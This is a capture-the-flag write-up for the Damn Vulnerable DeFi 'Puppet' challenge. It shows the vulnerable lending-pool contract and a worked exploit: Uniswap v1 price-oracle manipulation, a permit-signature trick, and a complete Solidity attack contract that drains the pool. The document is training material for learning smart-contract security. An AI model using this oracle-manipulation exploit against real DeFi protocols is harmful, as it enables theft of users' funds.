# 08_Puppet

## Challenge

There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

There’s a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.

Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance.

You are provided with the code for the Pool:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";

/**
 * @title PuppetPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract PuppetPool is ReentrancyGuard {
    using Address for address payable;

    uint256 public constant DEPOSIT_FACTOR = 2;

    address public immutable uniswapPair;
    DamnValuableToken public immutable token;

    mapping(address => uint256) public deposits;

    error NotEnoughCollateral();
    error TransferFailed();

    event Borrowed(address indexed account, address recipient, uint256 depositRequired, uint256 borrowAmount);

    constructor(address tokenAddress, address uniswapPairAddress) {
        token = DamnValuableToken(tokenAddress);
        uniswapPair = uniswapPairAddress;
    }

    // Allows borrowing tokens by first depositing two times their value in ETH
    function borrow(uint256 amount, address recipient) external payable nonReentrant {
        uint256 depositRequired = calculateDepositRequired(amount);

        if (msg.value < depositRequired)
            revert NotEnoughCollateral();

        if (msg.value > depositRequired) {
            unchecked {
                payable(msg.sender).sendValue(msg.value - depositRequired);
            }
        }

        unchecked {
            deposits[msg.sender] += depositRequired;
        }

        // Fails if the pool doesn't have enough tokens in liquidity
        if(!token.transfer(recipient, amount))
            revert TransferFailed();

        emit Borrowed(msg.sender, recipient, depositRequired, amount);
    }

    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
    }

    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }
}
```

## Solution

Our goal in this challenge can be achieved by manipulating the price oracle. As the lending pool calculates the amount of collateral based on a exchange pool that we can access, we can change the exchange rate by buying from the pool. As this pool only has a very low liquidity and no minimum liquidity constraints, we can easily shift the exchange rate into the route that we want. This needs a few steps:

1. We approve the exchange to manage our tokens.
2. We call the tokenToEthSwapInput() function of the exchange (as this doesn't directly reduce our balance of the token, but uses transferFrom we need to do the 1. step).
3. The exchange swaps our tokens for eth.
4. The exhange rate shifts to 1 eth being worth a lot more than 1 token.
5. We send our money to the Pool and retrieve all the tokens for almost no eth.

This can easily be achieved in 3 calls in the hardhat script.

```js
await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
await uniswapExchange.connect(player).tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1, 20775029706);
await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {value: await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)});
```

This would unfortunately have been to easy, so the testcase also included the assertion that all has to be done in 1 tx. Packaging the 2. and 3. call into a constructor isn't that much of an issue, but approve() would still have to be called before. So we somehow have to also get the call to approve() into the constructor. Luckily the DVT uses a ERC20 implementation that includes functionality for the EIP2612 functionality of permit(). What permit() does, is that it allows you to set an allowance to yourself, from another contract, if you are able to present a valid signature from said contract.

To generate a valid signature we first need to find out where our contract will be deployed. Luckily there is a ethers function for that, getContractAddress(), which we can use as we know the issuers address as well as the nonce (0).

```js
const futureAddress = ethers.utils.getContractAddress({from: player.address, nonce: 0});
```

Then we need to generate a valid signature for said call. We can use the ethers function signERC2612Permit() which yields us a valid signature.

```js
const {v,r,s} = await signERC2612Permit(player, token.address, player.address, futureAddress, ethers.constants.MaxUint256, ethers.constants.MaxUint256);
```

I then wrote a attack contract which executes the before mentioned steps.

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./PuppetPool.sol";
import "../DamnValuableToken.sol";

contract Attack_Puppet{
    PuppetPool pool;
    DamnValuableToken token;

    constructor(address _pool, address _exchange, address _token, uint8 v, bytes32 r, bytes32 s) payable
    {
        token = DamnValuableToken(_token);
        pool = PuppetPool(_pool);
        uint256 amount = token.balanceOf(msg.sender);

        //transfer the tokens to ourself
        token.permit(msg.sender, address(this), type(uint256).max, type(uint256).max, v, r, s);
        token.transferFrom(msg.sender, address(this), amount);

        //exchange the tokens into ETH and crash the price inside the oracle by doing that
        token.approve(_exchange, amount);
        (bool success, ) = _exchange.call(abi.encodeWithSignature("tokenToEthSwapInput(uint256,uint256,uint256)", amount, 1, 20775029706));
        require(success, "Exchange failed");

        //Lend out all the tokens
        pool.borrow{value: pool.calculateDepositRequired(token.balanceOf(_pool))}(token.balanceOf(_pool), msg.sender);
    }
}
```

Finally we need to deploy the contract:

```js
const Attack_Puppet = await ethers.getContractFactory('Attack_Puppet', player);
await Attack_Puppet.deploy(lendingPool.address, uniswapExchange.address, token.address, v, r, s, {value:  ethers.utils.parseEther('24')});
```

After the constructor is called we have the pools tokens and are finished.